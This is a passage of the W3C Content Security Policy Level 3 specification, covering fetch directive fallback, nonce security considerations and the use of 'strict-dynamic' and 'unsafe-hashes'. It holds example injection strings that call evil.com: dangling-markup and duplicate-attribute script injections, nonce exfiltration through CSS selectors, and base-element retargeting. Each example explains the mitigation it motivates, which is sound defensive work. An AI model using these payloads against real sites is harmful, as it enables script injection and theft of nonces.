          <p>Return <code>&lt;&lt; "font-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>img-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "img-src", "default-src" >></code>.</p>
        </ol>
      </dl>
     <li data-md>
      <p>Return <code>&lt;&lt; >></code>.</p>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Should fetch directive execute" data-level="6.7.4" id="should-directive-execute"><span class="secno">6.7.4. </span><span class="content"> Should fetch directive execute </span><a class="self-link" href="#should-directive-execute"></a></h4>
    <p>This algorithm is used for <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives③">fetch directives</a> to decide whether a directive
  should execute or defer to a different directive that is better suited.
  For example: if the <var>effective directive name</var> is <code>worker-src</code> (meaning that
  we are currently checking a worker request), a <code>default-src</code> directive
  should not execute if a <code>worker-src</code> or <code>script-src</code> directive exists.</p>
    <p>Given a string (<var>effective directive name</var>), a string (<var>directive name</var>) and
  a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧①">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>directive fallback list</var> be the result of executing <a href="#directive-fallback-list">§ 6.7.3 Get fetch directive fallback list</a> on <var>effective directive name</var>.</p>
     <li data-md>
      <p>For each <var>fallback directive</var> in <var>directive fallback list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>directive name</var> is <var>fallback directive</var>, Return "<code>Yes</code>".</p>
       <li data-md>
        <p>If <var>policy</var> contains a directive whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①⑥">name</a> is <var>fallback directive</var>,  Return "<code>No</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>No</code>".</p>
    </ol>
   </section>
   <section>
    <h2 class="heading settled" data-level="7" id="security-considerations"><span class="secno">7. </span><span class="content">Security and Privacy Considerations</span><a class="self-link" href="#security-considerations"></a></h2>
    <h3 class="heading settled" data-level="7.1" id="security-nonces"><span class="secno">7.1. </span><span class="content">Nonce Reuse</span><a class="self-link" href="#security-nonces"></a></h3>
    <p>Nonces override the other restrictions present in the directive in which
  they’re delivered. It is critical, then, that they remain unguessable, as
  bypassing a resource’s policy is otherwise trivial.</p>
    <p>If a server delivers a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑧">nonce-source</a> expression as part of a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧②">policy</a>, the server MUST generate a unique value each time it
  transmits a policy. The generated value SHOULD be at least 128 bits long
  (before encoding), and SHOULD be generated via a cryptographically secure
  random number generator in order to ensure that the value is difficult for
  an attacker to predict.</p>
    <p class="note" role="note"><span class="marker">Note:</span> Using a nonce to allow inline script or style is less secure than
  not using a nonce, as nonces override the restrictions in the directive in
  which they are present. An attacker who can gain access to the nonce can
  execute whatever script they like, whenever they like. That said, nonces
  provide a substantial improvement over <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline③">'unsafe-inline'</a> when
  layering a content security policy on top of old code. When considering <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline④">'unsafe-inline'</a>, authors are encouraged to consider nonces
  (or hashes) instead.</p>
    <h3 class="heading settled" data-level="7.2" id="security-nonce-hijacking"><span class="secno">7.2. </span><span class="content">Nonce Hijacking</span><a class="self-link" href="#security-nonce-hijacking"></a></h3>
    <h4 class="heading settled" data-level="7.2.1" id="dangling-markup-attacks"><span class="secno">7.2.1. </span><span class="content">Dangling markup attacks</span><a class="self-link" href="#dangling-markup-attacks"></a></h4>
    <p>Dangling markup attacks such as those discussed in <a data-link-type="biblio" href="#biblio-filedescriptor-2015" title="CSP 2015">[FILEDESCRIPTOR-2015]</a> can be used to repurpose a page’s legitimate nonces for injections. For
  example, given an injection point before a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⓪">script</a></code> element:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>p</c-><c- p>></c->Hello, [INJECTION POINT]<c- p>&lt;/</c-><c- f>p</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <p>If an attacker injects the string "<code>&lt;script src='https://evil.com/evil.js' </code>",
  then the browser will receive the following:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>p</c-><c- p>></c->Hello, <c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>'https://evil.com/evil.js'</c-> &lt;/<c- e>p</c-><c- p>></c->
<c- o>&lt;</c->script nonce<c- o>=</c->abc src<c- o>=</c->/good.js><c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <p>It will then parse that code, ending up with a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①①">script</a></code> element with a <code>src</code> attribute pointing to a malicious payload, an attribute named <code>&lt;/p></code>,
  an attribute named "<code>&lt;script</code>", a <code>nonce</code> attribute, and a
  second <code>src</code> attribute which is helpfully discarded as duplicate by the parser.</p>
    <p>The <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm attempts to mitigate this specific
  attack by walking through <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①②">script</a></code> or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element③">style</a></code> element attributes, looking for the
  string "<code>&lt;script</code>" or "<code>&lt;style</code>" in their names or values.</p>
    <p>User-agents must pay particular attention when implementing this algorithm to
  not ignore duplicate attributes. If an element has a duplicate attribute any
  instance of the attribute after the first one is ignored but in the <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm, all attributes including the
  duplicate ones need to be checked.</p>
    <p class="issue" id="issue-74cb0fbd"><a class="self-link" href="#issue-74cb0fbd"></a> Currently the HTML spec’s parsing algorithm removes this information
  before the <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm can be run which makes it
  impossible to actually detect duplicate attributes. <a href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a></p>
    <p>For the following example page:</p>
<pre class="highlight">Hello, [INJECTION POINT]
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <p>The following injected string will use a duplicate attribute to attempt to
  bypass the <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> algorithm check:</p>
<pre class="highlight">Hello, <c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>'https://evil.com/evil.js'</c-> <c- e>x</c-><c- o>=</c-><c- s>""</c-> <c- e>x</c-><c- o>=</c->
<c- s>&lt;script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>"abcd"</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <h4 class="heading settled" data-level="7.2.2" id="nonce-exfiltration-content-attributes"><span class="secno">7.2.2. </span><span class="content">Nonce exfiltration via content attributes</span><a class="self-link" href="#nonce-exfiltration-content-attributes"></a></h4>
    <p>Some attacks on CSP rely on the ability to exfiltrate
  nonce data via various mechanisms that can read content attributes.
  CSS selectors are the best example: through clever use of
  prefix/postfix text matching selectors values can be sent out to an
  attacker’s server for reuse. Example:</p>
<pre class="highlight">script<c- p>[</c->nonce=a<c- p>]</c-> <c- p>{</c-> <c- k>background</c-><c- p>:</c-> <c- nf>url</c-><c- p>(</c-><c- s>"https://evil.com/nonce?a"</c-><c- p>);}</c->
</pre>
    <p>The <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce①">nonce</a></code> section talks about mitigating these types
  of attacks by hiding the nonce from the element’s content attribute and
  moving it into an internal slot. This is done to ensure that the <code>nonce</code> value is exposed to scripts but not any other non-script channels.</p>
    <h3 class="heading settled" data-level="7.3" id="security-nonce-retargeting"><span class="secno">7.3. </span><span class="content">Nonce Retargeting</span><a class="self-link" href="#security-nonce-retargeting"></a></h3>
    <p>Nonces bypass <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source⑤">host-source</a> expressions, enabling developers to load code from any
  origin. This, generally, is fine, and desirable from the developer’s perspective. However, if an
  attacker can inject a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element③">base</a></code> element, then an otherwise safe page can be subverted when relative
  URLs are resolved. That is, on <code>https://example.com/</code> the following code will load <code>https://example.com/good.js</code>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <p>However, the following will load <code>https://evil.com/good.js</code>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>base</c-> <c- e>href</c-><c- o>=</c-><c- s>"https://evil.com"</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    <p>To mitigate this risk, it is advisable to set an explicit <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element④">base</a></code> element on every page, or to
  limit the ability of an attacker to inject their own <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element⑤">base</a></code> element by setting a <a data-link-type="dfn" href="#base-uri" id="ref-for-base-uri①"><code>base-uri</code></a> directive in your page’s policy. For example, <code>base-uri 'none'</code>.</p>
    <h3 class="heading settled" data-level="7.4" id="security-css-parsing"><span class="secno">7.4. </span><span class="content">CSS Parsing</span><a class="self-link" href="#security-css-parsing"></a></h3>
    <p>The <a data-link-type="dfn" href="#style-src" id="ref-for-style-src">style-src</a> directive restricts the locations from which the
  protected resource can load styles. However, if the user agent uses a lax CSS
  parsing algorithm, an attacker might be able to trick the user agent into
  accepting malicious "stylesheets" hosted by an otherwise trustworthy origin.</p>
    <p>These attacks are similar to the CSS cross-origin data leakage attack
  described by Chris Evans in 2009 <a data-link-type="biblio" href="#biblio-css-abuse" title="Generic cross-browser cross-domain theft">[CSS-ABUSE]</a>. User agents SHOULD defend
  against both attacks using the same mechanism: stricter CSS parsing rules for
  style sheets with improper MIME types.</p>
    <h3 class="heading settled" data-level="7.5" id="security-violation-reports"><span class="secno">7.5. </span><span class="content">Violation Reports</span><a class="self-link" href="#security-violation-reports"></a></h3>
    <p>The violation reporting mechanism in this document has been designed to
  mitigate the risk that a malicious web site could use violation reports to
  probe the behavior of other servers. For example, consider a malicious web
  site that allows <code>https://example.com</code> as a source of images. If the
  malicious site attempts to load <code>https://example.com/login</code> as an image, and
  the <code>example.com</code> server redirects to an identity provider (e.g. <code>identityprovider.example.net</code>), CSP will block the request. If violation
  reports contained the full blocked URL, the violation report might contain
  sensitive information contained in the redirected URL, such as session
  identifiers or purported identities. For this reason, the user agent includes
  only the URL of the original request, not the redirect target.</p>
    <p>Note also that violation reports should be considered attacker-controlled data. Developers who
  wish to collect violation reports in a dashboard or similar service should be careful to properly
  escape their content before rendering it (and should probably themselves use CSP to further
  mitigate the risk of injection). This is especially true for the "<code>script-sample</code>" property of
  violation reports, and the <code class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample②">sample</a></code> property of <code class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent③">SecurityPolicyViolationEvent</a></code>, which are both completely attacker-controlled strings.</p>
    <h3 class="heading settled" data-level="7.6" id="source-list-paths-and-redirects"><span class="secno">7.6. </span><span class="content">Paths and Redirects</span><a class="self-link" href="#source-list-paths-and-redirects"></a></h3>
    <p>To avoid leaking path information cross-origin (as discussed
  in Egor Homakov’s <a href="https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html">Using Content-Security-Policy for Evil</a>),
  the matching algorithm ignores the path component of a source
  expression if the resource being loaded is the result of a
  redirect. For example, given a page with an active policy of <code><a data-link-type="dfn" href="#img-src" id="ref-for-img-src③">img-src</a> example.com example.org/path</code>:</p>
    <ul>
     <li data-md>
      <p>Directly loading <code>https://example.org/not-path</code> would fail, as it doesn’t match the policy.</p>
     <li data-md>
      <p>Directly loading <code>https://example.com/redirector</code> would pass, as it matches <code>example.com</code>.</p>
     <li data-md>
      <p>Assuming that <code>https://example.com/redirector</code> delivered a redirect response pointing to <code>https://example.org/not-path</code>,
  the load would succeed, as the initial URL matches <code>example.com</code>,
  and the redirect target matches <code>example.org/path</code> if we ignore its path component.</p>
    </ul>
    <p>This restriction reduces the granularity of a document’s policy when redirects are in play, a
  necessary compromise to avoid brute-forced information leaks of this type.</p>
    <p>The relatively long thread <a href="https://lists.w3.org/Archives/Public/public-webappsec/2014Feb/0036.html">"Remove paths from CSP?"</a> from public-webappsec@w3.org has more detailed discussion around alternate proposals.</p>
    <h3 class="heading settled" data-level="7.7" id="security-secure-upgrades"><span class="secno">7.7. </span><span class="content">Secure Upgrades</span><a class="self-link" href="#security-secure-upgrades"></a></h3>
    <p>To mitigate one variant of history-scanning attacks like Yan Zhu’s <a href="http://diracdeltas.github.io/sniffly/">Sniffly</a>, CSP will not allow pages to lock
  themselves into insecure URLs via policies like <code>script-src http://example.com</code>. As described in <a href="#match-schemes">§ 6.6.2.7 scheme-part matching</a>, the scheme portion of a source expression will always allow upgrading to a
  secure variant.</p>
    <h3 class="heading settled" data-level="7.8" id="security-inherit-csp"><span class="secno">7.8. </span><span class="content"> CSP Inheriting to avoid bypasses </span><a class="self-link" href="#security-inherit-csp"></a></h3>
    <p>As described in <a href="#initialize-document-csp" id="ref-for-initialize-document-csp⑥">§ 4.2.1 Initialize a Document’s CSP list</a> and <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp④">§ 4.2.2 Initialize a global object’s CSP list</a>,
  documents loaded from <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme⑤">local schemes</a> will inherit a copy of the
  policies in the <a data-link-type="dfn">source browsing context</a>. The goal is to ensure that a page can’t
  bypass its policy by embedding a frame or opening a new window containing
  content that is entirely under its control (<code>srcdoc</code> documents, <code>blob:</code> or <code>data:</code> URLs, <code>about:blank</code> documents that can be manipulated via <code>document.write()</code>, etc).</p>
    <div class="example" id="example-d8547a52">
     <a class="self-link" href="#example-d8547a52"></a> If this would not happen a page could execute inline scripts even without <code>unsafe-inline</code> in the page’s execution context by simply embedding a <code>srcdoc</code> <code>iframe</code>. 
<pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>srcdoc</c-><c- o>=</c-><c- s>"&lt;script>alert(1);&lt;/script>"</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->
</pre>
    </div>
    <p>Note that we create a copy of the <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②③">CSP list</a> which
  means that the new <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑧">Document</a></code>'s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②④">CSP list</a> is a
  snapshot of the relevant policies at its creation time. Modifications in the <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②⑤">CSP list</a> of the new <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑨">Document</a></code> won’t affect the <a data-link-type="dfn">source browsing context</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②⑥">CSP list</a> or vice-versa.</p>
    <div class="example" id="example-46761516">
     <a class="self-link" href="#example-46761516"></a> In the example below the image inside the iframe will not load because it is
    blocked by the policy in the <code>meta</code> tag of the iframe. The image outside the
    iframe will load (assuming the main page policy does not block it) since the
    policy inserted in the iframe will not affect it. 
<pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>srcdoc</c-><c- o>=</c-><c- s>'&lt;meta http-equiv="Content-Security-Policy" content="img-src example.com;"></c->
<c- s>                   &lt;img src="not-example.com/image">'</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->

<c- p>&lt;</c-><c- f>img</c-> <c- e>src</c-><c- o>=</c-><c- s>"not-example.com/image"</c-><c- p>></c->
</pre>
    </div>
   </section>
   <section>
    <h2 class="heading settled" data-level="8" id="authoring-considerations"><span class="secno">8. </span><span class="content">Authoring Considerations</span><a class="self-link" href="#authoring-considerations"></a></h2>
    <h3 class="heading settled" data-level="8.1" id="multiple-policies"><span class="secno">8.1. </span><span class="content"> The effect of multiple policies </span><a class="self-link" href="#multiple-policies"></a></h3>
    <p><em>This section is not normative.</em></p>
    <p>The above sections note that when multiple policies are present, each must be
  enforced or reported, according to its type. An example will help clarify how
  that ought to work in practice. The behavior of an <code>XMLHttpRequest</code> might seem unclear given a site that, for whatever reason, delivered the
  following HTTP headers:</p>
    <div class="example" id="example-7bb4ce67">
     <a class="self-link" href="#example-7bb4ce67"></a> 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②⓪">Content-Security-Policy</a>: default-src 'self' http://example.com http://example.net;
                         connect-src 'none';
<a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②①">Content-Security-Policy</a>: connect-src http://example.com/;
                         script-src http://example.com/
</pre>
    </div>
    <p>Is a connection to example.com allowed or not? The short answer is that the
  connection is not allowed. Enforcing both policies means that a potential
  connection would have to pass through both unscathed. Even though the second
  policy would allow this connection, the first policy contains <code>connect-src 'none'</code>, so its enforcement blocks the connection. The
  impact is that adding additional policies to the list of policies to enforce
  can <em>only</em> further restrict the capabilities of the protected resource.</p>
    <p>To demonstrate that further, consider a script tag on this page. The first
  policy would lock scripts down to <code>'self'</code>, <code>http://example.com</code> and <code>http://example.net</code> via the <code>default-src</code> directive. The second, however,
  would only allow script from <code>http://example.com/</code>. Script will only load if
  it meets both policy’s criteria: in this case, the only origin that can match
  is <code>http://example.com</code>, as both policies allow it.</p>
    <h3 class="heading settled" data-level="8.2" id="strict-dynamic-usage"><span class="secno">8.2. </span><span class="content"> Usage of "<code>'strict-dynamic'</code>" </span><a class="self-link" href="#strict-dynamic-usage"></a></h3>
    <p>Host- and path-based policies are tough to get right, especially on sprawling origins like CDNs.
  The <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes">solutions
  to Cure53’s H5SC Minichallenge 3: "Sh*t, it’s CSP!"</a> <a data-link-type="biblio" href="#biblio-h5sc3" title="H5SC Minichallenge 3: &quot;Sh*t, it&apos;s CSP!&quot;">[H5SC3]</a> are good examples of the
  kinds of bypasses which such policies can enable, and though CSP is capable of mitigating these
  bypasses via exhaustive declaration of specific resources, those lists end up being brittle,
  awkward, and difficult to implement and maintain.</p>
    <p>The "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic④"><code>'strict-dynamic'</code></a>" source expression aims to make Content
  Security Policy simpler to deploy for existing applications who have a high
  degree of confidence in the scripts they load directly, but low confidence in
  their ability to provide a reasonable list of resources to load up front.</p>
    <p>If present in a <a data-link-type="dfn" href="#script-src" id="ref-for-script-src②"><code>script-src</code></a> or <a data-link-type="dfn" href="#default-src" id="ref-for-default-src④"><code>default-src</code></a> directive, it has
  two main effects:</p>
    <ol>
     <li data-md>
      <p><a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source⑥">host-source</a> and <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source④">scheme-source</a> expressions, as well as the "<a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline⑤"><code>'unsafe-inline'</code></a>"
  and "<a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③④"><code>'self'</code></a> <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source⑧">keyword-source</a>s will be
  ignored when loading script.</p>
      <p><a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑧">hash-source</a> and <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑨">nonce-source</a> expressions
  will be honored.</p>
     <li data-md>
      <p>Script requests which are triggered by non-<a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted③">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①③">script</a></code> elements are allowed.</p>
    </ol>
    <p>The first change allows you to deploy "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑤"><code>'strict-dynamic'</code></a> in a
  backwards compatible way, without requiring user-agent sniffing: the policy <code>'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic'</code> will act like <code>'unsafe-inline' https:</code> in browsers that support CSP1, <code>https:   'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV'</code> in browsers that support CSP2, and <code>'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguVV' 'strict-dynamic'</code> in browsers that
  support CSP3.</p>
    <p>The second allows scripts which are given access to the page via nonces or
  hashes to bring in their dependencies without adding them explicitly to the
  page’s policy.</p>
    <div class="example" id="example-fe711f2d">
     <a class="self-link" href="#example-fe711f2d"></a> Suppose MegaCorp, Inc. deploys the following policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②②">Content-Security-Policy</a>: <a data-link-type="dfn" href="#script-src" id="ref-for-script-src③">script-src</a> 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguV' <a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑥">'strict-dynamic'</a>
</pre>
     <p>And serves the following HTML with that policy active:</p>
<pre class="highlight">...
<c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://cdn.example.com/script.js"</c-> <c- e>nonce</c-><c- o>=</c-><c- s>"DhcnhD3khTMePgXwdayK9BsMqXjhguVV"</c-> <c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
...
</pre>
     <p>This will generate a request for <code>https://cdn.example.com/script.js</code>, which
    will not be blocked because of the matching <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce②">nonce</a></code> attribute.</p>
     <p>If <code>script.js</code> contains the following code:</p>
<pre class="highlight"><c- a>var</c-> s <c- o>=</c-> document<c- p>.</c->createElement<c- p>(</c-><c- t>'script'</c-><c- p>);</c->
s<c- p>.</c->src <c- o>=</c-> <c- t>'https://othercdn.not-example.net/dependency.js'</c-><c- p>;</c->
document<c- p>.</c->head<c- p>.</c->appendChild<c- p>(</c->s<c- p>);</c->

document<c- p>.</c->write<c- p>(</c-><c- t>'&lt;scr'</c-> <c- o>+</c-> <c- t>'ipt src="/sadness.js">&lt;/scr'</c-> <c- o>+</c-> <c- t>'ipt>'</c-><c- p>);</c->
</pre>
     <p><code>dependency.js</code> will load, as the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①④">script</a></code> element created by <code>createElement()</code> is not <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted④">"parser-inserted"</a>.</p>
     <p><code>sadness.js</code> will <em>not</em> load, however, as <code>document.write()</code> produces <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑤">script</a></code> elements which are <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted⑤">"parser-inserted"</a>.</p>
    </div>
    <p class="note" role="note"><span class="marker">Note:</span> With <a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑦">'strict-dynamic'</a>, scripts created at runtime will be
  allowed to execute. If the location of such a script can be controlled by an
  attacker, the policy will then allow the loading of arbitrary scripts. Developers
  that use <a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic⑧">'strict-dynamic'</a> in their policy should audit the uses
  of non-parser-inserted APIs and ensure that they are not invoked with potentially
  untrusted data. This includes applications or frameworks that tend to determine
  script locations at runtime.</p>
    <section>
     <h3 class="heading settled" data-level="8.3" id="unsafe-hashes-usage"><span class="secno">8.3. </span><span class="content"> Usage of "<code>'unsafe-hashes'</code>" </span><a class="self-link" href="#unsafe-hashes-usage"></a></h3>
     <p><em>This section is not normative.</em></p>
     <p>Legacy websites and websites with legacy dependencies might find it difficult
    to entirely externalize event handlers. These sites could enable such handlers
    by allowing <code>'unsafe-inline'</code>, but that’s a big hammer with a lot of
    associated risk (and cannot be used in conjunction with nonces or hashes).</p>
     <p>The "<a data-link-type="grammar" href="#grammardef-unsafe-hashes" id="ref-for-grammardef-unsafe-hashes②"><code>'unsafe-hashes'</code></a>" source expression aims to make
    CSP deployment simpler and safer in these situations by allowing developers
    to enable specific handlers via hashes.</p>
     <div class="example" id="example-5d2d17c6">
      <a class="self-link" href="#example-5d2d17c6"></a> MegaCorp, Inc. can’t quite get rid of the following HTML on anything
      resembling a reasonable schedule: 
<pre class="highlight"><c- p>&lt;</c-><c- f>button</c-> <c- e>id</c-><c- o>=</c-><c- s>"action"</c-> <c- e>onclick</c-><c- o>=</c-><c- s>"doSubmit()"</c-><c- p>></c->
</pre>
      <p>Rather than reducing security by specifying "<code>'unsafe-inline'</code>", they decide to use
      "<code>'unsafe-hashes'</code>" along with a hash source expression, as follows:</p>
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②③">Content-Security-Policy</a>:  <a data-link-type="dfn" href="#script-src" id="ref-for-script-src④">script-src</a> <a data-link-type="grammar" href="#grammardef-unsafe-hashes" id="ref-for-grammardef-unsafe-hashes③">'unsafe-hashes'</a> 'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='
</pre>
     </div>
     <p>The capabilities <code>'unsafe-hashes'</code> provides is useful for legacy sites, but should be
    avoided for modern sites. In particular, note that hashes allow a particular script to execute,
    but do not ensure that it executes in the way a developer intends. If an interesting capability
    is exposed as an inline event handler (say <code>&lt;a onclick="transferAllMyMoney()">Transfer&lt;/a></code>),
    then that script becomes available for an attacker to inject as <code>&lt;script>transferAllMyMoney()&lt;/script></code>. Developers should be careful to balance the risk of
    allowing specific scripts to execute against the deployment advantages that allowing inline
    event handlers might provide.</p>
    </section>
    <section>
     <h3 class="heading settled" data-level="8.4" id="external-hash"><span class="secno">8.4. </span><span class="content"> Allowing external JavaScript via hashes </span><a class="self-link" href="#external-hash"></a></h3>
     <p>In <a data-link-type="biblio" href="#biblio-csp2" title="Content Security Policy Level 2">[CSP2]</a>, hash <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression①⓪">source expressions</a> could only match inlined
    script, but now that Subresource Integrity <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a> is widely deployed,
    we can expand the scope to enable externalized JavaScript as well.</p>
     <p>If multiple sets of integrity metadata are specified for a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑥">script</a></code>, the
    request will match a policy’s <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑨">hash-source</a>s if and only if <em>each</em> item in a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑦">script</a></code>'s integrity metadata matches the policy.</p>
     <p class="note" role="note"><span class="marker">Note:</span> The CSP spec specifies that the contents of an inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑧">script</a></code> element
    or event handler needs to be encoded using <a data-link-type="dfn" href="https://encoding.spec.whatwg.org/#utf-8-encode" id="ref-for-utf-8-encode①">UTF-8 encode</a> before computing
    its hash. <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a> computes the hash on the raw resource that is being
    fetched instead. This means that it is possible for the hash needed to allow
    an inline script block to be different that the hash needed to allow an
    external script even if they have identical contents.</p>
     <div class="example" id="example-af80f2fd">
      <a class="self-link" href="#example-af80f2fd"></a> MegaCorp, Inc. wishes to allow two specific scripts on a page in a way
      that ensures that the content matches their expectations. They do so by
      setting the following policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②④">Content-Security-Policy</a>: script-src 'sha256-abc123' 'sha512-321cba'
</pre>
      <p>In the presence of that policy, the following <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⑨">script</a></code> elements would be
      allowed to execute because they contain only integrity metadata that matches
      the policy:</p>
